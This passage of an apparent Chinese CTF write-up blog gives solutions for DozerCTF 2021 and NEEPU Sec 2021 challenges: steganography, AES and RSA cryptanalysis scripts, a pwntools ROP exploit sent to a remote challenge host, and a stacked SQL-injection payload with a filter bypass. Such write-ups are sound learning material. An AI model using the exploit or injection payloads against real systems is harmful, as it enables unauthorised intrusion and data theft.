目录下有两个文件 flag.jpg 和 hint.png。 hint.png 分离出另一个 zip压缩包，检查发现头部错误且包含伪加密，修复头部 504B03040A000900 为 504B030414000000 ，在 easy_riddle 目录下有两个文件 hint.txt 和 letter.png。 letter.png 福尔摩斯使用过的跳舞小人密码，解出 DOZER，再结合之前 hint.png 内文字 guess what can you get !!!，用 outguess 从 flag.jpg 提取文件得flag： outguess -r flag.jpg -k DOZER -t out.txt ​ ezmisc 看不到看不到 xiaojiejie.jpg 分离出一张gif图片和一张png图片。 gif图片分帧分别扫二维码拼接得前半段 Dozer&#123;is_it_simple，png二维码图片扫码发现文字中间有不可见字符，猜测为零宽隐写，使用 unicode_steganography 提取字符： 123var s = unicodeSteganographers.setUseChars(&#x27;\\u200b\\u200c\\u200d\\u200e\\u200f&#x27;);s.decodeText(&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;) 解出后半段 _for_you!congratulate&#125; ​ funny_pixel 听说国赛有一个running_pixel? 按提示参考ciscn题，提取218张图片里的0/1，可按照0/1图案颜色（RGB: EFEF27）计算像素数来识别： 12345678910111213141516171819from PIL import Imageflag = &#x27;&#x27;for name in range(1,219): count = 0 framepic = Image.open(f&quot;./funny_pixel/&#123;name&#125;.png&quot;) framepic = framepic.convert(&quot;RGB&quot;) width,height = framepic.size for w in range(width): for h in range(height): if framepic.getpixel((w,h)) == (0xef,0xef,0x27): count += 1 print((name,count)) if count != 10 and count != 5: print(name) break flag += &#x27;0&#x27; if count == 10 else &#x27;1&#x27; #01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111 观察得到的0/1字符串，1000100 = D，1101111 = o，类推知每个字符7位二进制中间用0分隔，提取转回字符即为flag：DozerCTF&#123;D0_yOU_LIke_PixEl&#125;。 ​ 一点也不杂 出题人说，这个题目一点也不杂 三个文件，flag分三部分。 第一部分，5月日历+图片尾部13组数字，在日历上连线出猪圈密码图案，对照解出 DOYOUKNOW_CRT。 第二部分，简单中国剩余定理(CRT)应用，Sage运行crt([2,2,9,16],[5,7,17,23])，得key=5007。 第三部分，直接base85解码得 _good_over&#125; 加头 DozerCTF&#123; 拼接为flag。 ​ 做个问卷吧 赛题基本上线完毕，感谢参加DozerCTF 2021! 问卷：https://tp.wjx.top/vj/t2bF3sc.aspx 反馈+吐槽。 ​ CryptoHorcrux Harry Potter &amp;&amp; Aquila AeroCTF 2021原题，构造结式解椭圆曲线方程组+LLL算法+恢复参数值，参考： AeroCTF 2021 - Horcrux 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122from sage.all import *proof.arithmetic(False)p = 0x95a599ab706381e861caf2c6e757204c704b77a38592ae0db282000d8537ab0e4608ecd9a524ad6e14eb9564353b5c1036ff13c8503bfad7e8695d0bcf15df766c1be64aa4e73b75e0ecb28ea9e74eafc613d2fb9299fac060826bd071a92d2bd5be44d6d65e6b63146d617e800b79e25358b4a3e22a62457f2d39c21a694f54c03ad5d69a674fa6cd91c2971524152c1b6d177c455e0f255ce4fa18253da252613959c17b49ac422a9009933d0c59210646fca85e8ae35d5df34d6afde9d951909585c3f3e53e06ef5ae319fa035e57941599c2a73133bba490b66ab38e7537fd3ed322bf3a0431f02f276b5b18b623865883e3f0b67a511293b5a7576c97e6663cb1c32bdff5cda825549742d067e1b4ca847c75ef6b601feced3a9bb4dea41f1e5c40a8f2af2983f010d7bbc9ba992cedcdac6922a056d52873af110ae578da5e875fa6a121cdb45fe5e8198c121f7e9609d100d023a9155d6aa9efe28aa9036079564780db663aad36796ee8349b98b11d1b108125F = GF(p)x0 = F(0x93436a2bdfecc923d69385f164ef891ef5b08418e5b4e65c980e0b054e86ee8b8e24a527dad9fe3883234179167ada4b5f413c07c548f3dc224db1f2791c8a44bb857c722676d621fa07ad4beee4dc2be679c351cc19423aaff444e5c908b767d9ebec006bf0f020b8c0d15775fc84524333c47d4bc46ae8bd3cb18e1b037e59a388e39a81c1d97c9654742979ed54741df9aba6954c2801efb63d91ed1a51889ee1e8848b7bf111c987cb558e08b9caa17e50f578fa0af70bf855393dcc6c52420897eae663700818dbec237e094c1d4904a249d92702ab4046e52694db73a5fb83953262dff0251fa5fd1b4a99fb70addcde2a38d8766e02360b7b29aad1382ecdd63650f2b597469267dccc11ee7d0b10178c68a02b2d03db5bfcd6d663c11bc2ef855e30528aec48a9f4f53f71c52ac6e0c92fcaf0f8576982b1135bbb15fb5035c7853de51b8aa5b858646dd23b7b01d837c6b3c38f4bdcef6009ee02456bbdcbe8978eb400326c4fd0a899ed9f559ba963b25317)y0 = F(0x47b8c9d33929bfe12657a2f482213cca803fe37e8485ebde814dc91ce56ed480cea04f24176edce77ebfd7d9bba3a864cfe6176ef1d68ebc184dcde0667704adc472d1d16688affa657cff460edf05f92dad743ca3421150ec7ef98e08a9d17af033a555ed49f0e9c7457bf339a9270e8b44b7b75dd43afd27614d0ce59878c019d902d9ed23a26f04a431130534f85b05db586fd9a65a178204eb7d568a0e64dd16a369d2af6f2b8cd32a9e9be8322885c78a30dc8019ca3c48f39bad38de4ab60970ee1c44688d2afa901f46af7d2e7ced0e34204d6b38330fd87d6bf5bb61378e092780a48b985654de1c65b0a6146a82f84bfe09359820942980ce5c607bfc14497a79436bc4f351ae697875d93049c30dafc698208a17f9b785aa35448e4ef341102053c62a9923287f4cf597ff492fd0eac4ef77ae879a22c6c8a3a53baef09f574316fd872e1a6dd1ad9eb72a3e39f925e25fe06f7983b785dcb110bd127c8e2736e7345fd7ffce687c66c492a541e00c500574)x1 = F(0x37a181d88a683e2eeba3147bfb3043be6067fc722b8578255e25a335fadda9ead31c41d7742dbf3df7e4c3effc9297ef528730b3d8920978e342e123b9f19ab15a5ed2c19c45aaee728e53acd8c44e7543c4b9bcd40f27b8efac1a1e431ddbab15b4341c6cc817516634c2ab1117e784e429b9f797963b18442127342455d469ca9d9ff24b241afe9b7fdd4b91bb9750710e6f00b9fe631c1db71c308ef4642251fc00d0433910161d588c100944d55935ddf7dc656cc1670065c5bc6607358304c228f8495cca579a3a78102b4e617687f3aad0c5826e3aa7a85c85c99af2254002d3578c0af342ea1f49b9a425eba90e2473470fec77a945b45cf67dde9cb4e0ef445b974164cbcb61ec7cbcd77c94d42c6dce15ae500e4b6b15d38923ba2773176ae1e3354baaae47b422ec0ff8273538ad0a6a03a33d60a52257698130f6db6baaa4d338e167443eb4ac1b57b0d6f424e9d0b2f6b6b0df609b81150928286443afe7d1b9bbb30389af0db1597945d233cd19121d11)y1 = F(0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1)x2 = F(0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b)y2 = F(0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308)BITS = 32R = PolynomialRing(F, names=&#x27;aa1, aa2, bb1, bb2, a, b&#x27;)aa1, aa2, bb1, bb2, a, b = R.gens()bounds = dict(aa1=2**BITS, aa2=2**BITS, bb1=2**BITS, bb2=2**BITS)eq0 = x0**3 + a*x0 + b - y0**2eq1 = (x1 + aa1)**3 + a*(x1 + aa1) + b - (y1 + bb1)**2eq2 = (x2 + aa2)**3 + a*(x2 + aa2) + b - (y2 + bb2)**2def resultant(p1, p2, var): p1 = p1.change_ring(QQ) p2 = p2.change_ring(QQ) var = var.change_ring(QQ) r = p1.resultant(p2, var) return r.change_ring(F)poly = eq0poly1 = resultant(poly, eq1, b)poly2 = resultant(poly, eq2, b)poly = resultant(poly1, poly2, a)poly /= poly.coefficients()[0]print(poly.monomials())bits = 0for mono in poly.monomials(): mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), 2)) print(mono, &quot;%.2f&quot; % mono_bits ) bits += mono_bitsn = len(poly.monomials())m = matrix(ZZ, n, n)m[0] = vector(poly.coefficients())m[1:,1:] = p * identity_matrix(n-1)def prmat(m): for row in m: print(*[&#123;0: &quot;0&quot;, 1: &quot;1&quot;, p: &quot;p&quot;&#125;.get(v, &quot;x&quot;) for v in row])prmat(m)monos = vector(poly.change_ring(ZZ).monomials())factors = [mono(**bounds) for mono in monos][m.rescale_col(i, factor) for i, factor in enumerate(factors)]m = m.LLL()m = m.change_ring(QQ)[m.rescale_col(i, QQ(1)/factor) for i, factor in enumerate(factors)]m = m.change_ring(ZZ)polys = []for pol in m*monos: maxval = sum( (abs(int(coef)) * mono).change_ring(ZZ).subs(**bounds) for coef, mono in pol ) print(&quot;polynomial with max value&quot;, RR(log(maxval, 2)), &quot;bits&quot;) if maxval &lt; p: polys.append(pol)print(&quot;got&quot;, len(polys), &quot;polynomials&quot;)def recover(hs, vars, solbits, padbits=20): nbits = solbits + padbits from itertools import product sols = &#123;(0,) * len(vars)&#125; polys = [h.change_ring(Zmod(2**nbits)) for h in hs] for i in range(nbits): print(&quot;bit&quot;, i, &quot;/&quot;, nbits, &quot;:&quot;, len(sols), &quot;candidates&quot;) sols2 = set() mod = 2**i polys = [h.change_ring(Zmod(2*mod)) for h in hs] for bits in product(range(2), repeat=len(vars)): for sol in sols: sol2 = tuple(ss + bit*mod for ss, bit in zip(sol, bits)) if any(poly(*sol2) for poly in polys): continue sols2.add(sol2) sols = sols2 if not sols: print(&quot;fail&quot;, i) return print(&quot;sols?&quot;, i, len(sols)) # TBD: automate adding pad bits to determine right sols by smallness for sol in sols: # fix signs sol = [v if v &lt; 2**(nbits-1) else (v-2**nbits) for v in sol] # too large solution if any(abs(v) &gt;= 2**solbits for v in sol): continue # wrong solution if any(poly(*sol) for poly in hs): continue yield sol R = PolynomialRing(ZZ, names=&#x27;aa1, aa2, bb1, bb2&#x27;)polys = [R(pol) for pol in polys]sols = list(recover(polys[:4], R.gens(), BITS))from struct import packct = bytes.fromhex(&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;)sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[0]parts = [ (int(x1)+int(sol_aa1))^^int(x1), (int(y1)+int(sol_bb1))^^int(y1), (int(x2)+int(sol_aa2))^^int(x2), (int(y2)+int(sol_bb2))^^int(y2),]key = pack(&quot;&gt;4I&quot;, *parts)print(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125; ​ 手滑的袁学长 袁学长出题的时候不小心把密文给删掉几位，现在用$替换了一下，凑活看吧 代码逻辑： 123456789101112131415161718192021plain:I do not care the result2?9cf037f8b3a?2b19b5bda978c294?5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00key:2?9cf037f8b3a?2b19b5bda978c294?5encrypt:91e5fb43f053b21ce12e41df0b0ae0bb6a20c55719151$$fccecb4$$$$$2a27c8c582c6704f$$$$153bd3313b84235ace16a7b3b190$e487abfa9$cf379d1a3calgorithm:c1 = AES(key, p1^f2), e1=c1^f1c2 = AES(key, p2^c1), e2=c2^p1c3 = AES(key, p3^c2), e3=c3^p2c4 = AES(key, p4^c3), e4=c4^p3flag = f1+f2 从 key 和 e4 入手爆破，未知位数3+2=5层循环（16^5=1048576），根据已知条件，枚举求出flag： 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.strxor import *from Crypto.Cipher import AESimport stringdic = &#x27;0123456789abcdef&#x27;def xor_hex(s, t): return strxor(bytes.fromhex(s),bytes.fromhex(t)).hex().rjust(32,&#x27;0&#x27;)for key1 in dic: for key2 in dic: for key3 in dic: key = &#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;.format(key1,key2,key3) p1 = b&#x27;I do not care th&#x27;.hex() p2 = b&#x27;e result&#x27;.hex() + key[:8].encode().hex() p3 = key[8:24].encode().hex() p4 = key[24:].encode().hex() + &#x27;08&#x27;*8 for e41 in dic: for e42 in dic: e4 = &#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;.format(e41,e42) c4 = xor_hex(e4, p3) c3 = xor_hex(p4, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c4)).hex()) #e3 = 8c582c6704f$$$$153bd3313b84235ac e3 = xor_hex(c3, p2) if e3.startswith(&#x27;8c582c6704f&#x27;) and e3.endswith(&#x27;153bd3313b84235ac&#x27;): c2 = xor_hex(p3, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c3)).hex()) e2 = xor_hex(c2, p1) #e2 = 6a20c55719151$$fccecb4$$$$$2a27c if e2.startswith(&#x27;6a20c55719151&#x27;) and &#x27;fccecb4&#x27; in e2 and e2.endswith(&#x27;2a27c&#x27;): c1 = xor_hex(p2, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c2)).hex()) e1 = &#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27; f1 = xor_hex(e1, c1) f2 = xor_hex(p1, AES.new(bytes.fromhex(key), AES.MODE_ECB).decrypt(bytes.fromhex(c1)).hex()) print(bytes.fromhex(f1)+bytes.fromhex(f2)) #hei_my_bro_this_is_flag_you_know ​ strange encrypt 学长学姐说这题应该不难吧？ 已知 fl4g 和640次AES加密后的 fl4g_enc，640个生成的key 按 extend_secret 二进制位选择前半段或后半段作为每轮AES使用的 key。 已知10位 secret 的前两位，对应扩展 extend_secret 为： 123456extend_secret:s1=[?,?,?,?,7]s2=[8,?,?,?,?]p1=(xxxx xxxx xxxx xxxx 0111)*16p2=(1000 xxxx xxxx xxxx xxxx)*16ex=p1+p2 采用中间人攻击(MITM)，枚举 s1 中未知4位得到fl4g AES加密32次的可能值（16^4=65536），再枚举 s2 中未知4位得到 fl4g_enc AES解密32次的可能值（16^4=65536），两组可能值中相等的即为所求。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.strxor import *from Crypto.Cipher import AESimport hashlibinit_key = b&#x27;look_at_here!you_may_need_it!!&#x27;fl4g = b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;fl4g_enc = &#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;flag_enc = &#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;def pad(s): return s + (16 - (len(s) % 16)) * b&#x27;\\x11&#x27;def genKeys(init): keys = [] for _ in range(640): key = hashlib.md5(init).hexdigest() keys.append(key) init = key.encode() return keys def extend(s): s1 = [ int(s[2 * i], 16) for i in range(len(s)//2)] s2 = [ int(s[2 * i + 1], 16) for i in range(len(s)//2)][::-1] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 return part1 + part2keys = genKeys(init_key)def encrypt(msg): for i,k in enumerate(keys): b = int(ex[i]) &amp; 1 key = k[ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msgdef decrypt(msg): for i in range(640-1, -1, -1): b = int(ex[i]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg def half_enc(msg, ex): for i in range(320): b = int(ex[i]) &amp; 1 key = keys[i][ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msg def half_dec(msg, ex): for i in range(640-1, 320-1, -1): b = int(ex[i-320]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg mid = dict()for s11 in range(16): for s12 in range(16): for s13 in range(16): for s14 in range(16): s1 = [7, s11, s12, s13, s14] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 m = half_enc(pad(fl4g), part1).hex() mid.update(&#123;m: s1&#125;)print(len(mid)) for s22 in range(16): for s23 in range(16): for s24 in range(16): for s25 in range(16): s2 = [s22, s23, s24, s25, 8] part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 m = half_dec(bytes.fromhex(fl4g_enc), part2).hex() if m in mid: s1 = mid[m] print(s1) print(s2) #s1 = [7, 15, 9, 11, 15]#s2 = [8, 4, 13, 15, 8]#secret = 78ff9db4f8secret = &#x27;78ff9db4f8&#x27;ex = extend(secret)print(encrypt(pad(fl4g)).hex() == fl4g_enc)print(decrypt(bytes.fromhex(fl4g_enc)) == pad(fl4g))print(decrypt(bytes.fromhex(flag_enc)))#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11&#x27; ​ Rei wanna 大晚上特供版 晚上域渗透环境还是老是崩，没事儿来个i wanna 泄泄火，玩就是了 链接：https://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ 提取码：4s8s GameMaker开发的著名I Wanna系列小游戏。 用 GM8Decompiler 把exe恢复为gmk文件，再用 Gmk-Splitter 提取gmk文件中游戏素材，在图片堆里找到包含flag的一张图片。 ​ PwnPwnPwnPwn 貌似又是原题，锤爆这个出题人 nc 1.14.160.21 20001 简单ret2text64。 123456789101112from pwn import *r = remote(&#x27;1.14.160.21&#x27;, 20001)backdoor = 0x401176binsh1 = 0x401199binsh2 = 0x4011f9p_rdi = 0x401313p_rsi_r15 = 0x401311pay = &#x27;A&#x27; * 0x78 + p64(p_rdi) + p64(0xB16BAD) + p64(binsh1) + p64(p_rsi_r15) + p64(0xFEE1DEAD) + p64(0) + p64(p_rdi) + p64(0xBADF00D) + p64(binsh2) + p64(backdoor)r.sendline(pay)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NEEPU Sec 2021公开赛","slug":"match-NEEPU-Sec-2021公开赛","date":"2021-05-24T11:40:39.000Z","updated":"2021-05-24T17:48:45.003Z","comments":true,"path":"2021/05/24/match-NEEPU-Sec-2021公开赛/","permalink":"https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 东北电力大学校赛，Web综合程度高，Crypto太少了。 Rank: 3 NoobLinux入门 Linux基本指令 ls/dir: 访问当前目录 cat: 获取当前文件内容 grep: 匹配字符串 *: 匹配一个或多个字符 ?: 匹配一个字符 /: 根目录 hint: Linux的系统配置文件主要放在哪里? Linux命令大考察。 ls -al 当前目录发现 hint.txt cat hint.txt 查看内容：尝试访问根目录 ls -al / 根目录发现flag文件 cat /flag 查看内容：可以尝试grep 在根目录逐个文件夹用grep命令试，在/etc下发现关键字： grep -r -n &quot;Neepu&#123;&quot; /etc 结果： /etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125; ​ 最强大脑 不会吧，不会吧，不会有人不喜欢算算术吧… 10s限时算数题，利用python里的requests包处理就好： 12345678910111213141516171819202122import requestsurl = &#x27;http://neepusec.club:18495/&#x27;s = requests.Session()r = s.get(url)html = r.textstart = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;)for i in range(100): cal = html[start:end].replace(&#x27;&amp;nbsp&#x27;,&#x27;&#x27;) r = s.post(url,data=&#123;&#x27;answer&#x27;:str(eval(cal))&#125;) if &#x27;success&#x27; in r.text: print((i+1,&#x27;success&#x27;)) if &#x27;Neepu&#123;&#x27; in r.text: print(i+1) print(r.text) break html = r.text start = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8 end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;) ​ 随便注2.0 如果我告诉你网上有原题，你能做的出来吗? 百度/谷歌搜索: [强网杯 2019]随便注 强网杯2019 随便注原题魔改，堆叠注入，照着来。 1&#39; union select 1,2,database()# 得到过滤规则 return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\\*| | |\\./i&quot;,$inject); 空格用%0a代替，尝试堆叠注入： 0&#39;;show%0adatabases;# 得到数据库名：ctftraining, information_schema, mysql, performance_schema, supersqli, test 0&#39;;show%0atables;# 得到表名：@Neepu2021招新赛, words 0&#39;;desc%0a`@Neepu2021招新赛`;# 得到列名：flag, NO 原题有重命名法和预处理法可得flag，这里rename和set被禁，可用prepare 预处理+execute 执行的方法，构造select flag from `@Neepu2021招新赛` 16进制字符串，代入预处理语句拿flag： 1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;# ​ Webremote_table 这真的是远程桌面吗?或许吧… 翻一圈源码，在notfound.html找到flag。 ​ LOVE_DEATH&amp;ROBOTS Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come. 根据标题ROBOTS，容易想到robots.txt，访问发现/n33pvfl4g.php，再访问n33pvfl4g.php得flag。 ​ Misc15 Puzzle! You can do it! 手拼就是了，拼完有flag。 ​ 龙会说话？ 龙会聊天吗？ 第一层，一个文件 dragon 和一个加密压缩包 dragon’s talk.rar。 010editor查看 dragon，发现尾部49454E44AE426082是png文件尾，查找文件头89504E47，分离出png图片： 找到龙语解码工具，解出youseethedragon为rar密码。 第二层，一个 dragon’s talk.wav 文件。 用audacity未发现什么信息，尝试LSB隐写，用Silenteye无密码得到隐藏文件flag.txt。 ​ CryptoRSA Just RSA! 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from sympy import nextprimeimport gmpy2import randomdef encode (p1,p2,e): not_hint = (p1 + 1) * (p2 + 1) S = gmpy2.invert(e, not_hint) not_p = S%(p1+1) return not_pflag = b&#x27;Neepu&#123;********************&#125;&#x27;flag = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p*qe = nextprime(random.randint(1,1000))d = gmpy2.invert(e, (p-1)*(q-1))c = pow(flag, e, n)print(c)print(n)m = encode(p, q, e)c1 = pow(m, 7, n)c2 = pow(m+e, 7, n)print(c1)print(c2)&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27; 两部分： 第一部分 $n=pq,c=\\text{flag}^e \\bmod n$， 第二部分 $m=\\text{enc}(p,q,e),c_1=m^7 \\bmod n,c_2=(m+e)^7 \\bmod n$。 先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e&lt;1010$，爆破 $e$ 求出 $m$： 12345678910111213141516171819202122232425import binasciidef attack(c1, c2, n, e): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = (x)^7 - c1 g2 = (x+e)^7 - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 = 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892c2 = 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543for e in range(1,1000): m = attack(c1, c2, n, e) try: if pow(m,7,n) == c1: print((e,m)) except: pass#结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)#e = 71#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 又 $m=\\text{enc}(p,q,e)$，即 $eS=ed \\equiv 1 \\pmod {(p+1)(q+1)},dp=S \\bmod (p+1)=d \\bmod (p+1)$， 由于 $e \\cdot dp \\equiv e \\cdot d \\equiv 1 \\pmod {(p+1)}$，有 $e \\cdot dp-1=k \\cdot (p+1)$， 比较 $e \\cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大， 爆破 $k$，当同时满足 $(e \\cdot dp-1) \\bmod k =0$ 和 $n \\bmod \\Big(\\cfrac{e \\cdot dp-1}{k}-1\\Big)$ 时，$n$ 成功分解。 1234567891011n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543dp = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859e = 71c = 